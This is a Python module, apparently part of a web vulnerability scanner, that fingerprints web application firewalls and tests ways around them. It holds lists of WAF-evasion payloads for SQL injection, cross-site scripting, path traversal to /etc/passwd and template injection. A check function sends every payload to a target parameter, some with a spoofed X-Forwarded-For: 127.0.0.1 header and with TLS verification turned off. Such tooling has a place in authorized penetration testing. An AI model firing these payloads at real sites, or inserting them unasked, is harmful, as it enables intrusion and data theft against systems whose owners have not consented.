import re, copy
from typing import Optional, Dict, List
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url

logger = get_logger("waf_bypass")

WAF_EVIDENCE = {
    "cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cloudflare-nginx",
                   r"Attention Required!.*Cloudflare", r"cf-error-page"],
    "akamai": [r"akamai", r"akamaighost", r"reference.*akamai"],
    "mod_security": [r"mod_security", r"Mod Security", r"NOYB", r"403.*ModSecurity"],
    "aws_waf": [r"awswaf", r"AWSWAF", r"Request blocked.*AWS", r"waf.*allowed"],
    "imperva": [r"incapsula", r"Imperva", r"_Incapsula_Resource"],
    "f5_bigip": [r"BigIP", r"F5", r"TS[a-z0-9]{6,}="],
    "sucuri": [r"sucuri", r"Sucuri", r"Sucuri/Cloudproxy"],
    "barracuda": [r"barracuda", r"Barracuda"],
    "citrix_netscaler": [r"ns_af", r"citrix", r"NSC_"],
    "fortinet": [r"fortigate", r"FortiWeb", r"FORT_WAF"],
    "wordfence": [r"wordfence", r"WFWAF"],
    "safe3": [r"Safe3", r"safe3waf"],
    "comodo": [r"comodo", r"Comodo firewall"],
    "dotdefender": [r"dotdefender", r"dotDefender"],
}

WAF_HEADER_PATTERNS = {
    "cloudflare": ["cf-ray", "cf-cache-status"],
    "sucuri": ["x-sucuri-id", "x-sucuri-cache"],
    "akamai": ["x-akamai-*"],
    "mod_security": ["x-mod-security-*"],
    "aws_waf": ["x-amzn-*", "x-aws-waf-*", "x-amz-id-*"],
    "barracuda": ["x-barracuda-*"],
    "imperva": ["x-iinfo", "x-cdn"],
    "f5_bigip": ["x-ts-*"],
}

BYPASS_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'/**/OR/**/'1'='1",
        "'+OR+'1'='1",
        "'%0aOR%0a'1'='1",
        "'OR 1=1-- ",
        "1' OR '1'='1' /*",
        "1' OR 1=1-- ",
        "admin' --",
        "admin'/*",
        "' UNION SELECT 1,2,3-- ",
        "' UN/**/ION SEL/**/ECT 1,2,3-- ",
        "' UNION%0aSELECT%0a1,2,3-- ",
        "' UNION ALL SELECT 1,2,3-- ",
        "' UNION DISTINCT SELECT 1,2,3-- ",
        "' /*!12345UNION*/ SELECT 1,2,3-- ",
        "'+UNION+ALL+SELECT+1,2,3--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script/random=1>alert(1)</script>",
        "<script%%20>alert(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<img src=x onerror=alert(1)>",
        "<IMG SRC=x onerror=alert(1)>",
        "<img src=x onerror=alert(1) x=",
        "<img OOONerror=alert(1)>",
        "<img oonnerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg oNloAd=alert(1)><!-->",
    ],
    "lfi": [
        "/../" * 3 + "etc/passwd",
        "/....//....//....//etc/passwd",
        "/..;/..;/..;/etc/passwd",
        "/..%252f..%252f..%252fetc/passwd",
        "/..%c0%ae..%c0%ae..%c0%aetc/passwd",
        "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ],
    "ssti": [
        "{{999999*999999}}",
        "${999999*999999}",
        "#{999999*999999}",
        "<%= 999999 * 999999 %>",
        "{{7*'7'}}",
        "${7*'7'}",
        "{{999999*999999}}",
        "<%= 999999 * 999999 %>",
        "#{999999*999999}",
    ],
}


def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                    timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"detected": False, "name": None, "evidence": [], "all_matches": []}

    probes = [
        (url, "passive"),
        (url + "?id=%27%20OR%20%271%27=%271", "sqli_probe"),
        (url + "?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss_probe"),
    ]

    for target, source_label in probes:
        try:
            r = sess.get(target, timeout=timeout, verify=False)

            for k, v in r.headers.items():
                lower_k = k.lower()
                for waf_name, headers in WAF_HEADER_PATTERNS.items():
                    for h_pattern in headers:
                        if h_pattern.endswith("*"):
                            prefix = h_pattern.rstrip("*")
                            if lower_k.startswith(prefix):
                                result["detected"] = True
                                result["all_matches"].append({"waf": waf_name, "header": k, "source": source_label})
                                if not result["name"]:
                                    result["name"] = waf_name
                                    result["evidence"].append("header: %s" % k)
                        elif lower_k == h_pattern:
                            result["detected"] = True
                            result["all_matches"].append({"waf": waf_name, "header": k, "source": source_label})
                            if not result["name"]:
                                result["name"] = waf_name
                                result["evidence"].append("header: %s" % k)

            for waf_name, patterns in WAF_EVIDENCE.items():
                for pat in patterns:
                    if re.search(pat, r.text, re.IGNORECASE):
                        result["detected"] = True
                        result["all_matches"].append({"waf": waf_name, "pattern": pat, "source": source_label})
                        if not result["name"]:
                            result["name"] = waf_name
                            result["evidence"].append(pat)
                        break

            if source_label != "passive" and r.status_code in (403, 406, 429, 503):
                if not result["name"]:
                    result["all_matches"].append({"status_block": r.status_code, "source": source_label})

        except Exception as e:
            logger.debug("waf fingerprint probe %s: %s", source_label, e)

    return result


def generate_bypasses(vuln_type: str) -> List[str]:
    return BYPASS_PAYLOADS.get(vuln_type, [])


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {
        "waf": fingerprint_waf(url, sess, timeout),
        "bypasses": {},
    }

    for vtype, payloads in BYPASS_PAYLOADS.items():
        if param:
            tested = []
            for payload in payloads:
                try:
                    r = sess.get(build_url(url, param, payload),
                                 timeout=timeout, verify=False)
                    tested.append({"payload": payload[:25], "status": r.status_code,
                                   "length": len(r.text)})
                except Exception as e:
                    logger.debug("waf bypass %s: %s", payload[:15], e)

            for payload in payloads[:5]:
                try:
                    r = sess.get(build_url(url, param, payload),
                                 headers={"X-Forwarded-For": "127.0.0.1"},
                                 timeout=timeout, verify=False)
                    tested.append({"payload": "hdr:%s" % payload[:20], "status": r.status_code,
                                   "length": len(r.text)})
                except Exception as e:
                    logger.debug("waf bypass hdr %s: %s", payload[:15], e)

            if tested:
                result["bypasses"][vtype] = tested

    return result
